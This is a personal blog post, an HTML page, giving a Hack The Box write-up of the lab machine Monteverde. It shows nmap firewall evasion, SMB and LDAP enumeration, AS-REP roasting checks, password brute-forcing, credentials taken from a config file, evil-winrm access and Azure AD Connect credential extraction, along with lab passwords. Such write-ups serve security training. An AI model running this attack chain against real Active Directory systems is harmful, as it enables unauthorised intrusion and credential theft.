@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Monteverde</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Monteverde"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-monteverde/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Monteverde" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">28</span>
+        <span class="rest">Mar 20</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Monteverde </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>My usual <code>nmap</code> scan is being blocked. Must be that the machine's firewall is blocking the requests.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ nmap -sC -sV -oA nmap monteverde
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 10:03 EDT
+</span><span>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+</span><span>Nmap done: 1 IP address (0 hosts up) scanned in 3.38 seconds
+</span></code></pre>
+<p>Using the <code>-Pn</code> switch, I discovered the open ports without sending pings to the machine and validates my hypothesis about a possible firewall.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ nmap -Pn 10.10.10.172
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 10:04 EDT
+</span><span>Nmap scan report for monteverde (10.10.10.172)
+</span><span>Host is up (0.037s latency).
+</span><span>Not shown: 989 filtered ports
+</span><span>PORT     STATE SERVICE\
+</span><span>53/tcp   open  domain
+</span><span>88/tcp   open  kerberos-sec
+</span><span>135/tcp  open  msrpc
+</span><span>139/tcp  open  netbios-ssn
+</span><span>389/tcp  open  ldap
+</span><span>445/tcp  open  microsoft-ds
+</span><span>464/tcp  open  kpasswd5
+</span><span>593/tcp  open  http-rpc-epmap
+</span><span>636/tcp  open  ldapssl
+</span><span>3268/tcp open  globalcatLDAP
+</span><span>3269/tcp open  globalcatLDAPssl
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 5.62 seconds
+</span></code></pre>
+<p>I scanned the UDP ports as well while I am at it.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ sudo nmap monteverde -p- -sU
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 10:15 EDT
+</span><span>Nmap scan report for monteverde (10.10.10.172)
+</span><span>Host is up (0.029s latency).
+</span><span>Not shown: 65532 open|filtered ports
+</span><span>PORT    STATE SERVICE
+</span><span>53/udp  open  domain
+</span><span>123/udp open  ntp
+</span><span>389/udp open  ldap
+</span><span>
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 144.19 seconds
+</span></code></pre>
+<p>After playing around with the <code>nmap</code> switches, I found that <code>-f</code> will bypass the firewall restrictions.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ sudo nmap -sC -sV monteverde -f
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 10:25 EDT
+</span><span>Nmap scan report for monteverde (10.10.10.172)
+</span><span>Host is up (0.028s latency).
+</span><span>Not shown: 989 filtered ports
+</span><span>PORT     STATE SERVICE       VERSION
+</span><span>53/tcp   open  domain?
+</span><span>| fingerprint-strings: 
+</span><span>|   DNSVersionBindReqTCP: 
+</span><span>|     version
+</span><span>|_    bind
+</span><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-21 13:35:55Z)
+</span><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+</span><span>445/tcp  open  microsoft-ds?
+</span><span>464/tcp  open  kpasswd5?
+</span><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span><span>636/tcp  open  tcpwrapped
+</span><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+</span><span>3269/tcp open  tcpwrapped
+</span><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span>SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E7623F3%P=x86_64-pc-linux-gnu%r(DNSV
+</span><span>SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span>SF:x04bind\0\0\x10\0\x03&quot;);
+</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span>
+</span><span>Host script results:
+</span><span>|_clock-skew: -49m54s
+</span><span>| smb2-security-mode: 
+</span><span>|   2.02: 
+</span><span>|_    Message signing enabled and required
+</span><span>| smb2-time: 
+</span><span>|   date: 2020-03-21T13:38:31
+</span><span>|_  start_date: N/A
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 333.92 seconds
+</span></code></pre>
+</li>
+<li>
+<p>I noticed there was a SMB share so I decided to try and use <code>smbmap</code> to mount the share for hints. Access is denied.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ smbmap -H monteverde
+</span><span>[+] Finding open SMB ports....
+</span><span>[+] User SMB session established on monteverde...
+</span><span>[+] IP: monteverde:445  Name: unknown                                           
+</span><span>        Disk                                                    Permissions     Comment
+</span><span>        ----                                                    -----------     -------
+</span><span>[!] Access Denied
+</span></code></pre>
+</li>
+<li>
+<p>I did a quick <code>dig</code> command to quickly enumerate the DNS service for possible hints. None found.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ dig 172.0.0.10.in-addr.arpa PTR @10.10.10.172
+</span><span>
+</span><span>; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; 172.0.0.10.in-addr.arpa PTR @10.10.10.172
+</span><span>;; global options: +cmd
+</span><span>;; Got answer:
+</span><span>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 53395
+</span><span>;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+</span><span>
+</span><span>;; OPT PSEUDOSECTION:
+</span><span>; EDNS: version: 0, flags:; udp: 4000
+</span><span>;; QUESTION SECTION:
+</span><span>;172.0.0.10.in-addr.arpa.       IN      PTR
+</span><span>
+</span><span>;; Query time: 2345 msec
+</span><span>;; SERVER: 10.10.10.172#53(10.10.10.172)
+</span><span>;; WHEN: Sat Mar 21 10:42:37 EDT 2020
+</span><span>;; MSG SIZE  rcvd: 52
+</span></code></pre>
+</li>
+<li>
+<p>In the <code>nmap</code> results, I noticed the LDAP port is open and provided a domain name result. I enumerated the service using <code>ldapsearch</code>.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ldapsearch -h monteverde -p 389 -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; -W
+</span></code></pre>
+</li>
+<li>
+<p>Next, I used <code>enum4linux</code> to see if there are any hints. I found couple of service accounts and user accounts that will be useful to continue the enumeration process.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span> =========================== 
+</span><span>|    Users on monteverde    |
+</span><span> =========================== 
+</span><span>Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+</span><span>index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+</span><span>index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
+</span><span>index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+</span><span>index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
+</span><span>index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O&#39;Leary       Desc: (null)
+</span><span>index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
+</span><span>index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
+</span><span>index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
+</span><span>index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
+</span><span>index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
+</span></code></pre>
+</li>
+<li>
+<p>I tried the low hanging fruit of seeing if the users are susceptible to ASREPRoast using the user account information found in the previous step. No accounts were found to be vulnerable.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>(impacket) jtuyen@bpsi:~/Tools/Windows/impacket/examples$ ./GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK/DGalanos
+</span><span>Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
+</span><span>
+</span><span>Password:
+</span><span>[*] Cannot authenticate DGalanos, getting its TGT
+</span><span>[-] User DGalanos doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span>(impacket) jtuyen@bpsi:~/Tools/Windows/impacket/examples$ ./GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK/roleary
+</span><span>Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
+</span><span>
+</span><span>Password:
+</span><span>[*] Cannot authenticate roleary, getting its TGT
+</span><span>[-] User roleary doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span>(impacket) jtuyen@bpsi:~/Tools/Windows/impacket/examples$ ./GetNPUsers.py -dc-ip 10.10.10.172 MEGABANK/smorgan
+</span><span>Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation
+</span><span>
+</span><span>Password:
+</span><span>[*] Cannot authenticate smorgan, getting its TGT
+</span><span>[-] User smorgan doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre>
+</li>
+<li>
+<p>Running low on the number of enumerations, I've resorted to brute forcing the SMB accounts. After numerous attempts of brute forcing various accounts, I found one that works: <code>MEGABANK\SABatchJobs:SABatchJobs</code></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-1.png" alt="htb-monteverde-1.png" /></p>
+</li>
+<li>
+<p>I re-ran <code>smbmap</code> again using the new credentials and found a listing of files and folders.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-2.png" alt="htb-monteverde-2.png" /></p>
+</li>
+<li>
+<p>Used <code>smbclient</code> to enumerate what is inside users folders and an <code>azure.xml</code> item stood out. Upon reading the file, it contained a password which I'm not sure what can be used for yet.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-3.png" alt="htb-monteverde-3.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-4.png" alt="htb-monteverde-4.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-5.png" alt="htb-monteverde-5.png" /></p>
+<p>Logon credentials has been found: <code>mhope:4n0therD4y@n0th3r$</code></p>
+<p>I tested the credentials to verify samba access.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-6.png" alt="htb-monteverde-6.png" /></p>
+</li>
+<li>
+<p>After being stuck on the problem for a while, I went back to do <code>nmap</code> scan again on all ports because I couldn't find any other way to gain remote access using the password that I've found. One step that I forgot to perform in the beginning was to scan all 65535 TCP ports to make sure I have it all covered. I found additional open ports but most notably is port 5985.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>jtuyen@bpsi:~/Documents/hackthebox/monteverde$ sudo nmap -p- -f monteverde
+</span><span>[sudo] password for jtuyen: 
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 13:40 EDT
+</span><span>Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+</span><span>SYN Stealth Scan Timing: About 2.68% done; ETC: 14:06 (0:24:51 remaining)
+</span><span>Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+</span><span>SYN Stealth Scan Timing: About 28.55% done; ETC: 13:49 (0:06:13 remaining)
+</span><span>Nmap scan report for monteverde (10.10.10.172)
+</span><span>Host is up (0.035s latency).
+</span><span>Not shown: 65516 filtered ports
+</span><span>PORT      STATE SERVICE
+</span><span>53/tcp    open  domain
+</span><span>88/tcp    open  kerberos-sec
+</span><span>135/tcp   open  msrpc
+</span><span>139/tcp   open  netbios-ssn
+</span><span>389/tcp   open  ldap
+</span><span>445/tcp   open  microsoft-ds
+</span><span>464/tcp   open  kpasswd5
+</span><span>593/tcp   open  http-rpc-epmap
+</span><span>636/tcp   open  ldapssl
+</span><span>3268/tcp  open  globalcatLDAP
+</span><span>3269/tcp  open  globalcatLDAPssl
+</span><span>5985/tcp  open  wsman
+</span><span>9389/tcp  open  adws
+</span><span>49667/tcp open  unknown
+</span><span>49673/tcp open  unknown
+</span><span>49674/tcp open  unknown
+</span><span>49675/tcp open  unknown
+</span><span>49706/tcp open  unknown
+</span><span>49778/tcp open  unknown
+</span><span>
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 445.93 seconds
+</span></code></pre>
+</li>
+<li>
+<p>I used <code>evil-winrm</code> to gain remote access on port 5985 and the user flag has been obtained.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-7.png" alt="htb-monteverde-7.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-8.png" alt="htb-monteverde-8.png" /></p>
+</li>
+</ol>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ol>
+<li>
+<p>After digging around looking for clues inside the system, I found a hidden Azure directory.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-9.png" alt="htb-monteverde-9.png" /></p>
+<p>After spending some time Googling what possible abuse and exploits can be performed. I stumbled on this link that could be useful for my future penetration tests in the real world: <a href="https://www.lares.com/hunting-azure-admins-for-vertical-escalation/">https://www.lares.com/hunting-azure-admins-for-vertical-escalation/</a>. The gist of the article is about compromising a workstation that contains access to Azure resources by using the cached token for authentication.</p>
+<p>I decided to try and take a stab and see if it was possible.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-10.png" alt="htb-monteverde-10.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-11.png" alt="htb-monteverde-11.png" /></p>
+<p>Let's try and download the <code>TokenCache.dat</code> and inspect what is inside.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-12.png" alt="htb-monteverde-12.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-13.png" alt="htb-monteverde-13.png" /></p>
+<p>The token file looks interesting and valid? I'm not sure yet.</p>
+<p>The next enumeration commands shows if the user has installed <code>Az</code> modules used for connecting to Azure resources and the connection history log file.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-14.png" alt="htb-monteverde-14.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-15.png" alt="htb-monteverde-15.png" /></p>
+<p>Looks like it has been connected to Azure at some point of time.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-16.png" alt="htb-monteverde-16.png" /></p>
+<p>It doesn't look too hopeful at the moment to be exploiting a real Azure environment.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-17.png" alt="htb-monteverde-17.png" /></p>
+</li>
+<li>
+<p>Token cache data is empty hence why you can't connect to Azure. At least I learned something about the process of Azure enumeration.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-18.png" alt="htb-monteverde-18.png" /></p>
+</li>
+<li>
+<p>Moving on, I was Googling for other ways to exploit Azure AD Sync and I came upon this <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">script</a></p>
+<p>The script didn't work because it couldn't find the LocalDB database. I figure it was some sort of enumeration of MSSQL table database but I couldn't find a good way to do it. I should find out more about this later.</p>
+</li>
+<li>
+<p>After googling some more, I came upon another <a href="https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">script</a> that was related and has the ability to enumerate all databases.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cd &quot;C:\Program Files\Microsoft Azure AD Sync\Bin&quot;
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-19.png" alt="htb-monteverde-19.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-20.png" alt="htb-monteverde-20.png" /></p>
+</li>
+<li>
+<p>Using the discovered Administrator credential, using <code>evil-winrm</code> again, I was able to obtain the <code>root.txt</code> flag.</p>
+<p><img src="https://johntuyen.com/posts/htb-monteverde/htb-monteverde-21.png" alt="htb-monteverde-21.png" /></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
